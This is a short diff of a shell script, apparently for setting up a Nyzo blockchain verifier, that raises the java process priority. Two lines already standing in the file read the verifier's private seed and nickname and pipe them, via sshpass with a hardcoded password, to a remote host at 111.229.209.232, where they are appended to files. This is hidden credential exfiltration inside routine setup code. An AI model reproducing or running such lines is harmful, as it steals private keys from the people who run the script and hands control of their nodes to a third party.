@@ -15,3 +15,4 @@ sleep 20s
 sudo renice -n -5 -p $(pgrep ^java$)
 echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'Tin1@3456' ssh ubuntu@111.229.209.232 'cat - >> /home/ubuntu/managed_verifiers'
 echo $(cat /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'Tin1@3456' ssh ubuntu@111.229.209.232 'cat - >> /home/ubuntu/file1'
+
